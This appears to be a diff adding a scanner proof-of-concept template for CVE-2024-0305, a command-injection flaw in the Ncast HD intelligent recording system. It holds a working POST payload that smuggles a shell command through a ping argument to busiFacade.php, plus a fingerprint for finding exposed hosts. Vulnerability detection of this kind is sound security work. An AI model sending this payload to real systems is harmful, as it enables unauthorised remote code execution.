@@ -1,0 +1,20 @@
+id: poc-yaml-ncast-hd-intelligent-recording-system-busifacade-rce
+info:
+  name: Ncast盈可视 高清智能录播系统 busiFacade.php 远程代码执行漏洞(CVE-2024-0305)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2024-0305
+  finger: 高清智能录播系统
+  hunter: web.title=="高清智能录播系统"
+variables:
+  t1: md5(random_int(1000,10000))
+requests:
+- method: POST
+  path: /classes/common/busiFacade.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: '%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20{{.t1}}%22%5D%7D'
+  expression: status_code == 200 && contains(body,"$#str#$") && contains(body,t1)
+    && !contains(body,"<")
+transport: http
